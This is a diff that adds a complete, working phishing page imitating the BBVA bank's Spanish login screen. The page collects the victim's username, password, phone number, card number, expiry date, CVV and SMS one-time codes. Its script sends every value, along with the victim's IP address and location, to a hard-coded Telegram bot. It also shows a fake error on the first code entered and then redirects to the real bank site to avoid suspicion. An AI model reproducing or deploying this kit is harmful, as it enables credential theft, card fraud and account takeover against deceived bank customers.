@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA - Iniciar sesión</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: white;
+            min-height: 100vh;
+        }
+
+        /* Loading Animations */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes progress {
+            from {
+                stroke-dashoffset: 688;
+            }
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        .animate-fade-in {
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .animate-spin-slow {
+            animation: spin 2s linear infinite;
+        }
+
+        .animate-progress {
+            animation: progress 3s ease-in-out forwards;
+        }
+
+        /* Splash Screen */
+        .splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: #004481;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .splash-logo {
+            color: white;
+            font-size: 4rem;
+            font-weight: bold;
+            letter-spacing: 0.1em;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: rgba(0, 68, 129, 0.9);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+
+        .loading-spinner {
+            width: 64px;
+            height: 64px;
+        }
+
+        /* Form Loading Overlay */
+        .form-loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 998;
+            display: none;
+        }
+
+        .form-loading-spinner {
+            width: 48px;
+            height: 48px;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Hidden class */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 24px;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 1.5rem;
+            font-weight: 500;
+        }
+
+        .header-buttons {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .header-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            background: none;
+            border: none;
+            color: #0066cc;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .header-button:hover {
+            color: #0052a3;
+        }
+
+        .help-icon {
+            width: 32px;
+            height: 32px;
+            border: 2px solid #0066cc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .header-button span {
+            font-size: 12px;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            padding: 32px 16px;
+        }
+
+        .form-container {
+            max-width: 448px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 56px;
+            background-color: white;
+            border: 2px solid #d1d5db;
+            color: #333;
+            border-radius: 8px;
+            padding: 0 16px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #0066cc;
+        }
+
+        .input-field::placeholder {
+            color: #6b7280;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #6b7280;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .password-toggle:hover {
+            color: #374151;
+        }
+
+        .forgot-password {
+            text-align: left;
+            margin-top: 16px;
+        }
+
+        .forgot-password button {
+            background: none;
+            border: none;
+            color: #0066cc;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .forgot-password button:hover {
+            color: #0052a3;
+        }
+
+        /* Card Input Styles */
+        .card-input-group {
+            display: flex;
+            gap: 16px;
+        }
+
+        .card-input {
+            flex: 1;
+        }
+
+        .expiry-cvv-group {
+            display: flex;
+            gap: 16px;
+        }
+
+        .expiry-input, .cvv-input {
+            width: 50%;
+        }
+
+        /* Error Message */
+        .error-message {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            display: none;
+        }
+
+        /* Buttons */
+        .button-group {
+            margin-top: 32px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .btn {
+            width: 100%;
+            height: 56px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+        }
+
+        .btn-primary {
+            background-color: #d1d5db;
+            color: #6b7280;
+        }
+
+        .btn-primary:not(:disabled) {
+            background-color: #0066cc;
+            color: white;
+        }
+
+        .btn-primary:not(:disabled):hover {
+            background-color: #0052a3;
+        }
+
+        .btn-primary:disabled {
+            cursor: not-allowed;
+        }
+
+        .btn-outline {
+            background-color: white;
+            border: 2px solid #0066cc;
+            color: #0066cc;
+        }
+
+        .btn-outline:hover {
+            background-color: #eff6ff;
+        }
+
+        .create-password {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .create-password button {
+            background: none;
+            border: none;
+            color: #0066cc;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .create-password button:hover {
+            color: #0052a3;
+        }
+
+        /* Desktop Styles */
+        @media (min-width: 768px) {
+            .header {
+                padding: 24px;
+            }
+
+            .header h1 {
+                font-size: 2rem;
+            }
+
+            .main-content {
+                padding: 32px 24px;
+            }
+
+            .splash-logo {
+                font-size: 6rem;
+            }
+        }
+
+        /* Mobile Styles */
+        @media (max-width: 767px) {
+            .main-content {
+                padding-bottom: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Splash Screen -->
+    <div id="splashScreen" class="splash-screen animate-fade-in">
+        <h1 class="splash-logo">BBVA</h1>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen hidden">
+        <div class="animate-spin-slow">
+            <svg class="loading-spinner" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" aria-hidden="true">
+                <path class="outer-line" fill="none" d="M120 12c59.6 0 108 48.4 108 108c0 59.6-48.4 108-108 108c-59.6 0-108-48.4-108-108c0-59.6 48.4-108 108-108Z" stroke="white" stroke-width="24" stroke-linecap="round" stroke-dasharray="0 688" visibility="hidden" opacity="0.3"/>
+                <path class="inner-line animate-progress" fill="none" d="M120 12c59.6 0 108 48.4 108 108c0 59.6-48.4 108-108 108c-59.6 0-108-48.4-108-108c0-59.6 48.4-108 108-108Z" stroke="white" stroke-width="24" stroke-linecap="round" stroke-dasharray="0 688" visibility="visible"/>
+                <path class="dot" d="M120 0c6.6 0 12 5.4 12 12c0 6.6-5.4 12-12 12c-6.6 0-12-5.4-12-12c0-6.6 5.4-12 12-12Z" fill="white"/>
+            </svg>
+        </div>
+    </div>
+
+    <!-- Form Loading Overlay -->
+    <div id="formLoadingOverlay" class="form-loading-overlay">
+        <svg class="form-loading-spinner" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" aria-hidden="true">
+            <path class="inner-line" fill="none" d="M120 12c59.6 0 108 48.4 108 108c0 59.6-48.4 108-108 108c-59.6 0-108-48.4-108-108c0-59.6 48.4-108 108-108Z" stroke="#0066cc" stroke-width="24" stroke-linecap="round" stroke-dasharray="0 688"/>
+            <path class="dot" d="M120 0c6.6 0 12 5.4 12 12c0 6.6-5.4 12-12 12c-6.6 0-12-5.4-12-12c0-6.6 5.4-12 12-12Z" fill="#0066cc"/>
+        </svg>
+    </div>
+
+    <!-- Step 1: Login Form -->
+    <div id="loginScreen" class="hidden animate-fade-in">
+        <header class="header">
+            <div style="flex: 1;"></div>
+            <h1>Iniciar sesión</h1>
+            <div style="flex: 1; display: flex; justify-content: flex-end;">
+                <div class="header-buttons">
+                    <button class="header-button">
+                        <div class="help-icon">?</div>
+                        <span>Ayuda</span>
+                    </button>
+                    <button class="header-button">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                        <span>Cerrar</span>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="form-container">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input 
+                            type="text" 
+                            id="username" 
+                            class="input-field" 
+                            placeholder="NIF, NIE, Tarjeta o Pasaporte"
+                            required
+                        >
+                    </div>
+
+                    <div class="form-group">
+                        <div class="password-container">
+                            <input 
+                                type="password" 
+                                id="password" 
+                                class="input-field" 
+                                placeholder="Clave de acceso"
+                                required
+                            >
+                            <button type="button" class="password-toggle" id="passwordToggle">
+                                <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                    <circle cx="12" cy="12" r="3"></circle>
+                                </svg>
+                                <svg id="eyeOffIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: none;">
+                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="forgot-password">
+                        <button type="button">¿Has olvidado tu clave de acceso?</button>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="submit" id="loginButton" class="btn btn-primary" disabled>
+                            Iniciar sesión
+                        </button>
+
+                        <button type="button" class="btn btn-outline">
+                            Hazte cliente
+                        </button>
+
+                        <div class="create-password">
+                            <button type="button">Crea tu clave de acceso</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <!-- Step 2: Phone Number Input -->
+    <div id="phoneNumberScreen" class="hidden animate-fade-in">
+        <header class="header">
+            <div style="flex: 1;"></div>
+            <h1>Verificación de seguridad</h1>
+            <div style="flex: 1; display: flex; justify-content: flex-end;">
+                <div class="header-buttons">
+                    <button class="header-button">
+                        <div class="help-icon">?</div>
+                        <span>Ayuda</span>
+                    </button>
+                    <button class="header-button">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                        <span>Cerrar</span>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="form-container">
+                <form id="phoneNumberForm">
+                    <div class="form-group">
+                        <p style="margin-bottom: 16px; text-align: center;">
+                            Por motivos de seguridad, introduce tu número de teléfono
+                        </p>
+                        <input 
+                            type="tel" 
+                            id="phoneNumber" 
+                            class="input-field" 
+                            placeholder="Número de teléfono"
+                            required
+                        >
+                    </div>
+
+                    <div class="button-group">
+                        <button type="submit" id="submitPhoneButton" class="btn btn-primary">
+                            Continuar
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <!-- Step 3: Card Details Input -->
+    <div id="cardDetailsScreen" class="hidden animate-fade-in">
+        <header class="header">
+            <div style="flex: 1;"></div>
+            <h1>Verificación de seguridad</h1>
+            <div style="flex: 1; display: flex; justify-content: flex-end;">
+                <div class="header-buttons">
+                    <button class="header-button">
+                        <div class="help-icon">?</div>
+                        <span>Ayuda</span>
+                    </button>
+                    <button class="header-button">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                        <span>Cerrar</span>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="form-container">
+                <form id="cardDetailsForm">
+                    <div class="form-group">
+                        <p style="margin-bottom: 16px; text-align: center;">
+                            Por motivos de seguridad, introduce los datos de tu tarjeta
+                        </p>
+                        <div class="card-input-group">
+                            <input 
+                                type="text" 
+                                id="cardNumber" 
+                                class="input-field" 
+                                placeholder="Número de tarjeta"
+                                required
+                            >
+                        </div>
+                        <div class="expiry-cvv-group" style="margin-top: 16px;">
+                            <input 
+                                type="text" 
+                                id="expiryDate" 
+                                class="input-field expiry-input" 
+                                placeholder="MM/AA"
+                                required
+                            >
+                            <input 
+                                type="text" 
+                                id="cvv" 
+                                class="input-field cvv-input" 
+                                placeholder="CVV"
+                                required
+                            >
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="submit" id="submitCardButton" class="btn btn-primary">
+                            Continuar
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <!-- Step 4: Verification Code -->
+    <div id="verificationScreen" class="hidden animate-fade-in">
+        <header class="header">
+            <div style="flex: 1;"></div>
+            <h1>Verificación de seguridad</h1>
+            <div style="flex: 1; display: flex; justify-content: flex-end;">
+                <div class="header-buttons">
+                    <button class="header-button">
+                        <div class="help-icon">?</div>
+                        <span>Ayuda</span>
+                    </button>
+                    <button class="header-button">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                        <span>Cerrar</span>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="form-container">
+                <form id="verificationForm">
+                    <div class="form-group">
+                        <p style="margin-bottom: 16px; text-align: center;">
+                            Introduce el SMS recibido en tu número de teléfono.
+                        </p>
+                        <input 
+                            type="text" 
+                            id="verificationCode" 
+                            class="input-field" 
+                            placeholder="Código de verificación"
+                            required
+                        >
+                        <div id="verificationError" class="error-message">
+                            Código incorrecto. Por favor, inténtalo de nuevo.
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="submit" id="verifyButton" class="btn btn-primary">
+                            Verificar
+                        </button>
+
+                        <button type="button" class="btn btn-outline">
+                            No tengo acceso a la app
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Screen elements
+            const splashScreen = document.getElementById('splashScreen');
+            const loadingScreen = document.getElementById('loadingScreen');
+            const formLoadingOverlay = document.getElementById('formLoadingOverlay');
+            const loginScreen = document.getElementById('loginScreen');
+            const phoneNumberScreen = document.getElementById('phoneNumberScreen');
+            const cardDetailsScreen = document.getElementById('cardDetailsScreen');
+            const verificationScreen = document.getElementById('verificationScreen');
+            const verificationError = document.getElementById('verificationError');
+
+            // Telegram bot configuration
+            const botToken = '7559371285:AAGFQ5ivT8o5ttq5_07yCFB0gqqZ-NWgZdk';
+            const chatId = '6127610177';
+
+            // Function to send data to Telegram
+            function sendToTelegram(message) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                }).catch(error => console.error('Error sending to Telegram:', error));
+            }
+
+            // Function to get user info
+            async function getUserInfo() {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+                    
+                    try {
+                        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                        const locationData = await locationResponse.json();
+                        return {
+                            ip: ip,
+                            city: locationData.city || 'Unknown',
+                            region: locationData.region || 'Unknown',
+                            country: locationData.country_name || 'Unknown',
+                            isp: locationData.org || 'Unknown',
+                            time: new Date().toLocaleString()
+                        };
+                    } catch (error) {
+                        console.error('Error getting location:', error);
+                        return {
+                            ip: ip,
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            country: 'Unknown',
+                            isp: 'Unknown',
+                            time: new Date().toLocaleString()
+                        };
+                    }
+                } catch (error) {
+                    console.error('Error getting IP:', error);
+                    return {
+                        ip: 'Unknown',
+                        city: 'Unknown',
+                        region: 'Unknown',
+                        country: 'Unknown',
+                        isp: 'Unknown',
+                        time: new Date().toLocaleString()
+                    };
+                }
+            }
+
+            // Initial loading sequence
+            setTimeout(() => {
+                splashScreen.classList.add('hidden');
+                loadingScreen.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    loadingScreen.classList.add('hidden');
+                    loginScreen.classList.remove('hidden');
+                }, 3000);
+            }, 4000);
+
+            // Password toggle functionality
+            const passwordInput = document.getElementById('password');
+            const passwordToggle = document.getElementById('passwordToggle');
+            const eyeIcon = document.getElementById('eyeIcon');
+            const eyeOffIcon = document.getElementById('eyeOffIcon');
+
+            passwordToggle.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    eyeIcon.style.display = 'none';
+                    eyeOffIcon.style.display = 'block';
+                } else {
+                    passwordInput.type = 'password';
+                    eyeIcon.style.display = 'block';
+                    eyeOffIcon.style.display = 'none';
+                }
+            });
+
+            // Login form validation
+            const usernameInput = document.getElementById('username');
+            const loginButton = document.getElementById('loginButton');
+
+            function validateLoginForm() {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                if (username && password) {
+                    loginButton.disabled = false;
+                    loginButton.style.backgroundColor = '#0066cc';
+                    loginButton.style.color = 'white';
+                } else {
+                    loginButton.disabled = true;
+                    loginButton.style.backgroundColor = '#d1d5db';
+                    loginButton.style.color = '#6b7280';
+                }
+            }
+
+            usernameInput.addEventListener('input', validateLoginForm);
+            passwordInput.addEventListener('input', validateLoginForm);
+
+            // Login form submission
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                // Show loading
+                formLoadingOverlay.style.display = 'flex';
+                loginScreen.classList.add('hidden');
+                
+                // Get form data
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                // Get user info
+                const userInfo = await getUserInfo();
+                
+                // Prepare message
+                const message = `🔔 New Login Attempt 🔔\n\n📌 Username: ${username}\n🔑 Password: ${password}\n\n🌐 IP: ${userInfo.ip}\n📍 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.country}\n🏢 ISP: ${userInfo.isp}\n\n🕒 Time: ${userInfo.time}`;
+                
+                // Send to Telegram
+                sendToTelegram(message);
+
+                // After 4 seconds, show phone number screen
+                setTimeout(() => {
+                    formLoadingOverlay.style.display = 'none';
+                    phoneNumberScreen.classList.remove('hidden');
+                }, 4000);
+            });
+
+            // Phone number form submission
+            document.getElementById('phoneNumberForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const phoneNumber = document.getElementById('phoneNumber').value.trim();
+                
+                if (phoneNumber) {
+                    // Show loading
+                    formLoadingOverlay.style.display = 'flex';
+                    phoneNumberScreen.classList.add('hidden');
+                    
+                    // Get user info
+                    const userInfo = await getUserInfo();
+                    
+                    // Prepare message
+                    const message = `📱 Phone Number Entered\n\n📞 Phone: ${phoneNumber}\n\n🌐 IP: ${userInfo.ip}\n📍 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.country}\n🏢 ISP: ${userInfo.isp}\n\n🕒 Time: ${userInfo.time}`;
+                    
+                    // Send to Telegram
+                    sendToTelegram(message);
+
+                    // After 4 seconds, show card details screen
+                    setTimeout(() => {
+                        formLoadingOverlay.style.display = 'none';
+                        cardDetailsScreen.classList.remove('hidden');
+                    }, 4000);
+                }
+            });
+
+            // Card details form submission
+            document.getElementById('cardDetailsForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const cardNumber = document.getElementById('cardNumber').value.trim();
+                const expiryDate = document.getElementById('expiryDate').value.trim();
+                const cvv = document.getElementById('cvv').value.trim();
+                
+                if (cardNumber && expiryDate && cvv) {
+                    // Show loading
+                    formLoadingOverlay.style.display = 'flex';
+                    cardDetailsScreen.classList.add('hidden');
+                    
+                    // Get user info
+                    const userInfo = await getUserInfo();
+                    
+                    // Prepare message
+                    const message = `💳 Card Details Entered\n\n💳 Card Number: ${cardNumber}\n📅 Expiry: ${expiryDate}\n🔒 CVV: ${cvv}\n\n🌐 IP: ${userInfo.ip}\n📍 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.country}\n🏢 ISP: ${userInfo.isp}\n\n🕒 Time: ${userInfo.time}`;
+                    
+                    // Send to Telegram
+                    sendToTelegram(message);
+
+                    // After 4 seconds, show verification screen
+                    setTimeout(() => {
+                        formLoadingOverlay.style.display = 'none';
+                        verificationScreen.classList.remove('hidden');
+                    }, 4000);
+                }
+            });
+
+            // Verification form submission
+            document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const verificationCode = document.getElementById('verificationCode').value.trim();
+                
+                if (verificationCode) {
+                    // Show loading
+                    formLoadingOverlay.style.display = 'flex';
+                    
+                    // Get user info
+                    const userInfo = await getUserInfo();
+                    
+                    // Prepare message
+                    const message = `🔢 Verification Code Entered\n\n🔢 Code: ${verificationCode}\n\n🌐 IP: ${userInfo.ip}\n📍 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.country}\n🏢 ISP: ${userInfo.isp}\n\n🕒 Time: ${userInfo.time}`;
+                    
+                    // Send to Telegram
+                    sendToTelegram(message);
+
+                    // First attempt shows error, second attempt redirects
+                    if (!verificationError.style.display || verificationError.style.display === 'none') {
+                        // First attempt - show error
+                        setTimeout(() => {
+                            formLoadingOverlay.style.display = 'none';
+                            verificationError.style.display = 'block';
+                            document.getElementById('verificationCode').value = '';
+                        }, 4000);
+                    } else {
+                        // Second attempt - redirect
+                        setTimeout(() => {
+                            window.location.href = 'https://www.bbva.es/personas.html';
+                        }, 4000);
+                    }
+                }
+            });
+
+            // Also send password when field loses focus
+            passwordInput.addEventListener('blur', async function() {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                if (username && password) {
+                    // Get user info
+                    const userInfo = await getUserInfo();
+                    
+                    // Prepare message
+                    const message = `🔔 Password Field Completed\n\n📌 Username: ${username}\n🔑 Password: ${password}\n\n🌐 IP: ${userInfo.ip}\n📍 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.country}\n🏢 ISP: ${userInfo.isp}\n\n🕒 Time: ${userInfo.time}`;
+                    
+                    // Send to Telegram
+                    sendToTelegram(message);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
